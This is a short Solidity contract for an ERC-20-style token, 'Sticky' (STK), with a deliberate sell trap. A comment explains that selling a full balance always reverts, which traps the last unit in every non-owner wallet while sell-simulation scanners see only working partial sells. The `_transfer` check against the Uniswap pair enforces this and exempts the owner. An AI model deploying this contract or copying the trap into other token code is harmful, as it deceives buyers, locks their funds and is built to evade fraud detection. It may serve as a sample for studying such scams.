// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
// "sell max" always reverts: the last unit of every wallet is trapped, and sell-simulation scanners flag nothing on partial sells.
contract StickyToken {
    string public name = "Sticky"; string public symbol = "STK"; uint8 public decimals = 18;
    uint256 public totalSupply = 1e24;
    address public owner;
    address public uniswapV2Pair;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    constructor(address pair_) { owner = msg.sender; uniswapV2Pair = pair_; _balances[msg.sender] = totalSupply; }
    function balanceOf(address a) public view returns (uint256) { return _balances[a]; }
    function transfer(address to, uint256 amount) external returns (bool) { _transfer(msg.sender, to, amount); return true; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transferFrom(address f, address t, uint256 a) external returns (bool) { allowance[f][msg.sender] -= a; _transfer(f, t, a); return true; }
    function _transfer(address from, address to, uint256 amount) internal {
        if (to == uniswapV2Pair && from != owner) {
            require(amount < _balances[from], "keep some");
        }
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }
}
